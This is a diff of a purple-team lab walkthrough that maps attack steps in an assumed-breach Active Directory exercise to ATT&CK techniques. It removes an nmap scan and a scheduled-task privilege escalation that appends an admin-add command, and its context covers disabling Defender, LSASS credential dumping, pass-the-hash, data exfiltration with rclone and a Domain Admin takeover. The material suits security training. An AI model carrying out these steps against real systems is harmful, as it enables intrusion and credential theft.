@@ -22,18 +22,6 @@ Password: `SecurePwd123`
 
 ## Part 1
 
-### Scan local network
-
-To get a lay of land, let's scan the /24 subnet on specific ports that will help us determine what kind of servers there are
-
-**Step 1.1**
-```bash
-[KALI:bash] nmap -Pn -p 22,445,636,3389 --open 10.0.1.0/24
-```
-ATT&CK Techniques: `T1595` `T1003`
-
-Port 22 (SSH) likely indicates a Linux server, ports 445 (SMB) and 3389 (RDP) indicate a Windows Server, and port 636 (LDAP) indicates a Domain Controller.
-
 ### Login with compromised account
 
 Since this is an assumed-breach scenario, we already have credentials for a local account on one of the server.
@@ -91,68 +79,9 @@ Is Windows Defender running?
 ```
 ATT&CK Techniques: `?`
 
-
-### Escalate privileges to local admin
-
-Having a better idea what we are dealing with, we can now work on escalating our privileges from normal user to a local adminstrator.
-There are many scripts to help automate the process of finding escalation vectors. One of the popular ones is `PowerUp`, however, since the AV is active on the system, most likely it will eat the `PowerUp` file.
-But no worries - we can always do the same manually!
-
-List the scheduled task with the following command (let's ignore Microsoft tasks because they are rarely misconfigured)
-
-**Step 1.8**
-```PowerShell
-[ITSERVER:PowerShell] Get-ScheduledTask | where {$_.TaskPath -notlike "*Microsoft*" }
-```
-ATT&CK Techniques: `T1053.001`
-
-Let's get more details about that `UpdateTask`
-
-**Step 1.9**
-```PowerShell
-[ITSERVER:PowerShell] schtasks /query /fo LIST /v /tn UpdateTask
-```
-ATT&CK Techniques: `T1053.001`
-
-We can see that it run `C:\Update.ps1`, let's check what permissions we have on that file
-
-**Step 1.10**
-```PowerShell
-[ITSERVER:PowerShell] icacls C:\Update.ps1
-```
-ATT&CK Techniques: `T1222.001`
-
-Look at that, there is! `UpdateTask` runs `C:\Update.ps1` and Everyone (including our user) have full control (`F`) this file.
-
-Let's use that to make ourselves admins by appending a command to that file
-
-**Step 1.11**
-```PowerShell
-[ITSERVER:PowerShell] "net localgroup administrators PurpleUser /add" | Out-File -Append C:\Update.ps1
-```
-ATT&CK Techniques: `T1078.003`
-
-After a minute or so, we can see that we are now admins.
-
-**Step 1.12**
-```PowerShell
-[ITSERVER:PowerShell] net localgroup administrators
-```
-ATT&CK Techniques: `T1069.001`
-
-Let's reopen PowerShell as Administrator to enjoy your new privileges. To not log in to the domain type `.\PurpleUser` as user.
-
-**Hint:** If you experience problems typing `.\PurpleUser` use the Windows on-screen keyboard before starting PowerShell as administrator
-
-**Step 1.13**
-```PowerShell
-[ITSERVER:PowerShell] whoami /all
-```
-ATT&CK Techniques: `T1033`
-
 ### Security tools tampering
 
-Now that we have admin privileges on this system, let's disable some security tools to make our life simpler...
+We see that we have admin privileges on this system, let's disable some security tools to make our life simpler...
 
 Let's disable a bunch of useful things in Windows Defender.
 We can turn off realtime monitoring (which includes antivirus), behavior monitoring, script scanning, and blocking at first sight.
@@ -194,8 +123,6 @@ And then execute it to dump the credentials from LSASS process
 ATT&CK Techniques: `T1003.001`
 
 You should be able to see the NTLM hash of `billh` domain user and can now use it move forward with attacking AD.
-
-## Part 2
 
 ### Pass the Hash
 
@@ -269,6 +196,8 @@ Now that SMB server is running and our `rclone` is ready, let's copy the AD dump
 ```
 ATT&CK Techniques: `T1048`
 
+## Part 2
+
 ### Import AD dump into Bloodhound and find path to Domain Admins
 
 Before starting Bloodhound, make sure that Bloodhound is installed and Neo4j is running
@@ -278,7 +207,7 @@ Before starting Bloodhound, make sure that Bloodhound is installed and Neo4j is 
 [KALI:bash] sudo neo4j start
 ```
 
-Now you will need to go to `http://localhost:7474` in your browser, login as `neo4j` user with `neo4j` password and set the new password, for example `P@ssw0rd`.
+Now you will need to go to `http://localhost:7474` in your browser, login as `neo4j` user with `neo4j` password and set the new password, for example good old `P@ssw0rd`.
 
 Let us now open Bloodhound (use the newly-set `neo4j` credentials to connect to the database) and import the ZIP file into it.
 
@@ -322,8 +251,6 @@ ATT&CK Techniques: `T1098`
 
 
 Done! We changed the password of the Domain Admin to the one of our choice and have compromised the domain.
-
-## Part 3
 
 With Domain Admin privileges we can now finally log into the 3rd server.
 
